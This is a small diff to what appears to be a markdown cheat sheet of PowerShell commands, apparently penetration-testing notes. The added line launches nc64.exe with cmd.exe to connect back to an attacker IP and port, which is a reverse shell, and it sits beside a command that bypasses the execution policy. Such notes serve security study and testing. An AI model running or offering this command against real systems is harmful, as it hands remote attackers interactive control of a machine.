@@ -180,7 +180,7 @@ Get-ScheduledTask [-Taskname] [-TaskPath]
 Get-ExecutionPolicy
 Set-ExecutionPolicy bypass -scope process
 
-
+Start-Process -NoNewWindow "c:\path\to\shell\nc64.exe" "-e cmd.exe $attacker-ip $port"
 ```
 
 ## Services
